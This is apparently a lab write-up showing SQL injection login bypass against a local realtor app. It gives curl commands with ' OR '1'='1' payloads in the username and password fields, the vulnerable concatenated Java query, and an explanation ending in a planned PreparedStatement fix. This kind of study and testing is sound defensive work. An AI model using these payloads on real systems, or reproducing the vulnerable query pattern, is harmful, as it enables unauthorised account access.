## SQL Injection - Login Bypass

### 1. Baseline: failed normal login (wrong password)

```
$ curl -i -X POST http://localhost:7000/login -d "username=alice" -d "password=wrong"

HTTP/1.1 401 Unauthorized
{"error":"Invalid credentials"}
```

### 2. Baseline: successful normal login (correct password)

```
$ curl -i -X POST http://localhost:7000/login -d "username=alice" -d "password=password123"

HTTP/1.1 200 OK
{"token":"...","realtorId":1}
```

### 3. Exploit: injection via username field

```
$ curl -i -X POST http://localhost:7000/login \
  --data-urlencode "username=' OR '1'='1' -- " \
  --data-urlencode "password=anything"

HTTP/1.1 200 OK
{"token":"...","realtorId":1}
```

**Explanation:** the login query builds SQL by concatenating raw input directly into the string:

```java
String query = "SELECT * FROM realtors WHERE username = '" + username
        + "' AND password = '" + password + "'";
```

The payload `' OR '1'='1' -- ` closes the `username` string early, adds `OR '1'='1'` (always true), then uses `-- ` to comment out everything after it — including the entire `AND password = '...'` clause. The resulting query the database actually runs is effectively:

```sql
SELECT * FROM realtors WHERE username = '' OR '1'='1'
```

Since this is always true, the query returns the first row in the table regardless of the password supplied, bypassing authentication entirely.

### 4. Exploit: injection via password field

```
$ curl -i -X POST http://localhost:7000/login \
  --data-urlencode "username=bob" \
  --data-urlencode "password=' OR '1'='1"

HTTP/1.1 200 OK
{"token":"...","realtorId":2}
```

**Explanation:** here the username (`bob`) is valid, but the password field carries the injection. The resulting query becomes:

```sql
SELECT * FROM realtors WHERE username = 'bob' AND password = '' OR '1'='1'
```

Because SQL evaluates `AND` before `OR`, this is interpreted as:

```sql
WHERE (username = 'bob' AND password = '') OR ('1'='1')
```

The `'1'='1'` clause is always true, so the `OR` makes the entire condition true regardless of whether the password matched — again bypassing authentication.

### Screenshots

- `screenshot1.png` — baseline failed login vs. baseline successful login
- `screenshot2.png` — both injection payloads returning `200 OK` with valid tokens

### Key takeaway

Both exploits stem from the same root cause: user input is concatenated directly into a SQL string instead of being passed as a parameter. This will be fixed in Phase 4 by switching to `PreparedStatement` with `?` placeholders, which treats user input strictly as data — never as executable SQL syntax.